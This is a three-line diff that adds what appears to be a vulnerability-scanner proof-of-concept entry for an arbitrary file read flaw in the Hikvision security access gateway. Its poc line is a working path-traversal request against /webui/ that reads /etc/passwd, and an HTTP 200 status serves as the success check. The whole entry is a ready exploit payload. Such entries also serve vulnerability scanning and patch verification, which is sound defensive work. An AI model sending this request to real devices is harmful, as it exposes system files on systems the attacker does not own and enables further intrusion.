@@ -1,0 +1,3 @@
+name: "海康威视安全接入网关任意文件读取漏洞"
+poc: "/webui/?file_name=../../../../../etc/passwd&g=sys_dia_data_down"
+status_code: 200
